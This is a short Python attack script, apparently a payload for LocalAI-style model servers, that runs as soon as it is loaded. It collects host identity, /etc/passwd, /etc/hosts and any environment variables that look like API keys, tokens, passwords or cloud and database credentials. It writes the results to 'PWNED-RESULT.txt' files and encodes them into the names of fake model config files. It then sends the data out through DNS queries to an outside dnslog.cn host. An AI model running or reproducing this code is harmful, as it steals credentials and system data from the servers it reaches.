import os, subprocess, base64, sys
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|mysql|redis|postgres|aws|gcp|azure' | head -50; echo ===PASSWD===; head -10 /etc/passwd 2>/dev/null; echo ===HOSTS===; cat /etc/hosts 2>/dev/null | head -8", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写结果文件 (多路径)
    for p in ["/models/PWNED-RESULT.txt", "/tmp/PWNED-RESULT.txt", "/build/models/PWNED-RESULT.txt", "/app/models/PWNED-RESULT.txt", "/data/models/PWNED-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 写 .yaml 模型配置 (文件名=b64分段, watcher 扫描注册)
    seg = 40
    for i in range(0, len(b64), seg):
        part = b64[i:i+seg]
        yaml_content = "name: XFR-" + part + "\nbackend: llama-cpp\nmodel: /models/dummy.gguf\n"
        for p in ["/models/XFR-" + part + ".yaml", "/build/models/XFR-" + part + ".yaml", "/app/models/XFR-" + part + ".yaml"]:
            try:
                with open(p, "w") as f:
                    f.write(yaml_content)
            except: pass
    # DNS 外带 (主机名+前段数据)
    try:
        import socket
        DNS = "hc92gc.dnslog.cn"
        host = "nohost"
        try:
            host = open("/etc/hostname").read().strip()[:30]
        except: pass
        try:
            socket.gethostbyname(host.replace(".","-") + "." + DNS)
        except: pass
        for i in range(0, len(b64), 30):
            label = b64[i:i+30].replace("+","a").replace("/","b").replace("=","c")
            try:
                socket.gethostbyname(label + "." + DNS)
            except: pass
    except: pass
_run()
